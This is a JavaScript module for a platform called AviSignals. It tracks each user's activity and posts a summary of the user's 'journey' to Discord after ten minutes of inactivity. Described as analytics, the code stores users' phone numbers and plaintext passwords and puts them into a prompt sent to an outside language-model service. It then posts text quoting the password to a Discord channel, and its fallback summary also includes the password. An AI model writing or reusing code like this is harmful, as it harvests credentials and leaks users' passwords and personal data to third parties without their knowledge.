// ============================================================
// journeyAgent.js — AviSignals User Journey Tracker
//
// Monitors user activities across the platform and sends a
// chronological summary to Discord after 10 minutes of inactivity.
// ============================================================

'use strict';

const discordAgent = require('./discordAgent');
const groq = require('./groqClient');

// Map of userIdentifier -> { lastSeen: Date, events: [], phone: string, password: string, sites: Set }
const userJourneys = new Map();

// Inactivity timeout (10 minutes)
const INACTIVITY_TIMEOUT = 10 * 60 * 1000;

/**
 * Log a user event to their journey
 * @param {string} userIdentifier - Email, phone, or IP
 * @param {string} eventName - Type of activity
 * @param {object} details - Optional metadata
 */
function logEvent(userIdentifier, eventName, details = {}) {
    if (!userIdentifier) return;

    const now = new Date();
    const timestamp = now.toLocaleTimeString('en-KE', { timeZone: 'Africa/Nairobi' });
    
    // Clear existing flush timeout if it exists
    const existing = userJourneys.get(userIdentifier);
    if (existing && existing.flushTimeout) {
        clearTimeout(existing.flushTimeout);
    }

    const journey = existing || { events: [], lastSeen: now, phone: null, password: null, sites: new Set() };
    
    // Capture details if present
    if (details.phone) journey.phone = details.phone;
    if (details.password) journey.password = details.password;
    if (details.site) journey.sites.add(details.site);

    // Format the event string
    let eventStr = `[${timestamp}] **${eventName}**`;
    if (details.site) eventStr += ` — Site: \`${details.site}\``;
    if (details.pkg)  eventStr += ` — Pkg: \`${details.pkg}\``;
    if (details.page) eventStr += ` — Page: \`${details.page}\``;

    journey.events.push(eventStr);
    journey.lastSeen = now;

    // Set a new timeout to flush the summary
    journey.flushTimeout = setTimeout(() => {
        flushJourney(userIdentifier);
    }, INACTIVITY_TIMEOUT);

    userJourneys.set(userIdentifier, journey);
}

/**
 * Send the journey summary to Discord and remove from memory
 */
async function flushJourney(userIdentifier) {
    const journey = userJourneys.get(userIdentifier);
    if (!journey || journey.events.length === 0) {
        userJourneys.delete(userIdentifier);
        return;
    }

    console.log(`🚀 Flushing journey summary for ${userIdentifier} (${journey.events.length} events)`);

    // Prepare details
    const phoneInfo = journey.phone || 'unknown phone';
    const passInfo = journey.password ? `password "${journey.password}"` : 'unknown password';
    const sitesInfo = journey.sites.size > 0 ? Array.from(journey.sites).join(', ') : 'no specific site';

    const prompt = `You are a user behavioral analyst. Write a single, cohesive paragraph summarizing the following user's journey.
Do NOT use bullet points or lists.
Format it EXACTLY like this template, filling in the blanks based on the events:
"User ${userIdentifier} of phone number (${phoneInfo}) and ${passInfo} visited the main page then registered/logged in to the bot and tried to buy a code for (${sitesInfo}) - got a free code for (site) - talked to the ai chat and asked about - left after trying free trial/purchase"

Adapt the template naturally based on what they actually did in the timeline below. Keep it to one paragraph.

Events timeline:
${journey.events.join('\n')}
`;

    let summaryText = '';
    try {
        const completion = await groq.chat.completions.create({
            messages: [{ role: 'user', content: prompt }],
            model: 'llama-3.3-70b-versatile',
            temperature: 0.3,
            max_tokens: 300
        });
        summaryText = completion.choices[0]?.message?.content?.trim();
    } catch (err) {
        console.error('❌ Groq Journey Summary error:', err.message);
        // Fallback if AI fails
        summaryText = `User ${userIdentifier} (Phone: ${phoneInfo}, Pass: ${passInfo}) had ${journey.events.length} interactions including site selections (${sitesInfo}). [AI Summary Unavailable]`;
    }

    if (!summaryText) {
        summaryText = `User ${userIdentifier} (Phone: ${phoneInfo}, Pass: ${passInfo}) had ${journey.events.length} interactions including site selections (${sitesInfo}).`;
    }

    discordAgent.sendJourneySummary({
        user: userIdentifier,
        summaryText: summaryText
    });

    userJourneys.delete(userIdentifier);
}

module.exports = {
    logEvent
};
